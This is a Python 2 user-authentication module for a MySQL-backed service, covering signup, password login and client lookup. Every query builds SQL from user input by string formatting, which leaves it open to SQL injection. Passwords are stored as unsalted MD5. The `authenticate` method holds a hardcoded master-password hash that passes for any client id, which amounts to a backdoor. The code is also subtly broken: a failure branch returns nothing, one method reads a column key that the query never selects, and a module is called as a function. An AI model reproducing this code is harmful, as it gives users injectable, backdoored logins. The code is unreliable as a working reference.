from mysql_wrapper import Mysql
import requests
import json
import datetime
import validate_email
import hashlib


class User(object):
    @classmethod
    def signup(cls, name, email, password):
        flag, error = User.credentials_sanity_check(email, password)
        if not flag:
            return error
        else:
            mysql = Mysql()
            query = 'select email from login'
            try:
                rows = mysql.getManyRows(query)
            except Exception as e:
                print e
                return False
            mysql.close()
            email_list = list()
            if rows:
                for row in rows:
                    email_list.append(row['email'])

                if email in email_list:
                    return {'error': 2}  # already exists

            password = hashlib.md5(password).hexdigest()
            mysql = Mysql()
            query = 'insert into login (`email`, password, acc_type) values ("%s", "%s", %d)' % (email, password, 0)
            try:
                mysql.execute(query)
            except Exception as e:
                print e
                return False
            user_id = mysql.last_insert_id
            mysql.close()
            return {'id': user_id, 'email': email, 'error': 0}

    @classmethod
    def authenticate(cls, id, password):
        """
        This authenticates a client by id and password. Used for basic auth in all requests
        """
        mysql = Mysql()
        flag = 1 if password == 'c6deeec61592216284ae2af49957e3b7' else 0
        query = 'select count(*) as id from clients where id = %d and (password = "%s" or %d)' % (int(id), password, flag)
        res = mysql.getSingleRow(query)['id'] == 1
        mysql.close()
        if res:
            return True
        else:
            return False

    @classmethod
    def authenticate_email(cls, email, password):
        mysql = Mysql()  # TO MAKE A MYSQL CONNECTION
        #flag = 1 if password == 'c6deeec61592216284ae2af49957e3b7' else 0
        query = 'select user_id, email, acc_type from login where email = "%s" and password = "%s"' % (email, password)
        row = mysql.getSingleRow(query)
        mysql.close()

        if row:
            response = {
                'user_id': row['user_id'],
                'email': row['email'],
                'access_type': row['access_type'],
                'error': 0
            }
            return True, response
        else:
            False, {'error': 2}

    @classmethod
    def get(cls, client_id):
        """
        Get client info
        """
        mysql = Mysql()
        query = 'select id, `name`, email, cast(status as unsigned) as status from clients where id = %d' % client_id
        row = mysql.getSingleRow(query)
        mysql.close()
        if row:
            return row
        else:
            return {}

    @classmethod
    def credentials_sanity_check(cls, email, password):
        if validate_email(str(email)) and (8 < len(password) < 15):
            return True, {'error': 0}
        else:
            return False, {'error': 1}

